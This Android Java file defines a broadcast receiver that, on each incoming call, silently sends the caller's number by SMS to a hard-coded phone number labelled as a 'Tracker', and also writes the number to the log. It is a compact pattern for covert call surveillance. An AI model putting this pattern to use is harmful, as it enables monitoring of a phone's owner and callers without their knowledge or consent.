package nnk.com.cwp68;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;


public class MyIncomingCall extends BroadcastReceiver
{
    TelephonyManager tm;
    @Override
    public void onReceive(Context context, Intent intent)
    {
        Log.e("Status 1","1");
        tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        Log.e("Status 1","2");
        MyPhoneListener my = new MyPhoneListener();

        tm.listen(my,PhoneStateListener.LISTEN_CALL_STATE);
        Log.e("Status 1","5");
    }

    public class MyPhoneListener extends PhoneStateListener
    {
        @Override
        public void onCallStateChanged(int state, String incomingNumber)
        {
            if (state == TelephonyManager.CALL_STATE_RINGING)
            {
                Log.e("Status 1",incomingNumber);
                String mess = "Hi Your Tracker got a Call From "+incomingNumber;

                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage("+918960243044",null,mess,null,null);
                Log.e("Status 1",mess);
            }
        }
    }

}
